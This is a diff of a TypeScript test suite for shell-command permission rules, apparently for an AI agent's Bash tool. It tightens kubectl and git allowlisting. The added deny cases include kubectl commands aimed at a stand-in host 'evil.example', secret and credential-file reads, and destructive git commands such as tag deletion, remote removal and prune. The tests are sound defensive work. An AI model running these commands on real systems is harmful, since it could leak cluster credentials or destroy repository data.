@@ -624,7 +624,6 @@ describe("host shell-rule suggestions", () => {
   it.each([
     ["git status --short", "Bash(git status *)"],
     ["ls -la src", "Bash(ls *)"],
-    ["kubectl get pods -n web", "Bash(kubectl get *)"],
   ])("keeps a useful catalog wildcard for the safe workflow %s", (command, pattern) => {
     expect(buildShellRuleApproval(command, project, true, "conversation-a")).toMatchObject({ suggestedPattern: pattern, persistentAllowed: true, sessionAllowed: true });
   });
@@ -678,6 +677,14 @@ describe("host shell-rule suggestions", () => {
     "kubectl get pods --insecure-skip-tls-verify", "kubectl get --raw /api/v1/secrets", "kubectl logs web --kubeconfig /tmp/k",
     "kubectl get secrets", "kubectl get secret", "kubectl get secret/db", "kubectl describe secret db", "kubectl get pods,secrets",
     "kubectl get secrets.v1 -A",
+    // Round 4: pflag short clusters, file writers, manifest reads, TLS and basic auth.
+    "kubectl get pods -As https://evil.example", "kubectl get pods -Ashttps://evil.example", "kubectl get pods -ws https://evil.example",
+    "kubectl get pods --profile-output=important.db", "kubectl get pods --profile=cpu", "kubectl get pods --cache-dir /tmp/cache",
+    "kubectl get -f creds.yaml -o yaml", "kubectl describe -f creds.yaml", "kubectl get --filename=creds.yaml",
+    "kubectl get -k ./overlay", "kubectl get --kustomize ./overlay", "kubectl get pods --tls-server-name evil.example",
+    "kubectl get pods --username admin", "kubectl get pods --password hunter2",
+    "git prune", "git tag -d v1.0", "git tag --delete v1.0", "git remote remove origin", "git remote rm origin",
+    "git pull --force", "git pull -f origin main",
     // git ref and object deletion.
     "git gc --prune=now", "git gc --aggressive --prune", "git reflog expire --expire=now --all", "git reflog delete HEAD",
     "git worktree remove --force wt", "git worktree remove -f wt", "git worktree prune", "git update-ref -d refs/heads/x",
@@ -690,22 +697,24 @@ describe("host shell-rule suggestions", () => {
     expect(buildShellRuleApproval(command, project, true, "conversation-a")).toMatchObject({ suggestedPattern: null, persistentAllowed: false });
     expect(refusedShellPrefix(command.split(" "), false)).not.toBeNull();
     expect(() => validatePermissionRule({ pattern: `Bash(${command})`, action: "allow" })).toThrow();
-    for (const wildcard of ["Bash(kubectl get *)", "Bash(kubectl describe *)", "Bash(kubectl logs *)", "Bash(git log *)"]) {
-      expect(shellRuleCoversCommand(wildcard, "allow", command, project)).toBe(false);
-    }
+    expect(shellRuleCoversCommand("Bash(git log *)", "allow", command, project)).toBe(false);
   });
 
   it.each([
     ["npm test", "Bash(npm test)"], ["npm run build", "Bash(npm run build)"], ["bun test", "Bash(bun test)"],
     ["pnpm run build", "Bash(pnpm run build)"], ["git fetch origin", "Bash(git fetch origin)"],
-    ["kubectl get pods -n web", "Bash(kubectl get *)"], ["kubectl logs web -f", "Bash(kubectl logs *)"],
-    ["kubectl describe pod web", "Bash(kubectl describe *)"], ["xattr -l app", "Bash(xattr -l app)"],
+    ["kubectl get pods -n web", "Bash(kubectl get pods -n web)"], ["kubectl logs web -f", "Bash(kubectl logs web -f)"],
+    ["kubectl describe pod web", "Bash(kubectl describe pod web)"], ["xattr -l app", "Bash(xattr -l app)"],
+    ["git tag v1.0", "Bash(git tag v1.0)"], ["git remote show origin", "Bash(git remote show origin)"], ["git pull origin main", "Bash(git pull origin main)"],
   ])("keeps the safe workflow %s one click as %s", (command, pattern) => {
     expect(buildShellRuleApproval(command, project, true, "conversation-a")).toMatchObject({ suggestedPattern: pattern, persistentAllowed: true });
     expect(shellRuleCoversCommand(pattern, "allow", command, project)).toBe(true);
   });
 
-  it.each(["Bash(npm test *)", "Bash(npm run build *)", "Bash(bun test *)", "Bash(yarn run build *)", "Bash(git fetch *)", "Bash(git fetch origin *)"])(
+  it.each([
+    "Bash(npm test *)", "Bash(npm run build *)", "Bash(bun test *)", "Bash(yarn run build *)", "Bash(git fetch *)", "Bash(git fetch origin *)",
+    "Bash(kubectl get *)", "Bash(kubectl describe *)", "Bash(kubectl logs *)", "Bash(kubectl get pods *)",
+  ])(
     "refuses the former catalog wildcard %s at the store", (pattern) => {
       expect(() => validatePermissionRule({ pattern, action: "allow" })).toThrow(/wildcard allowlist/);
     },
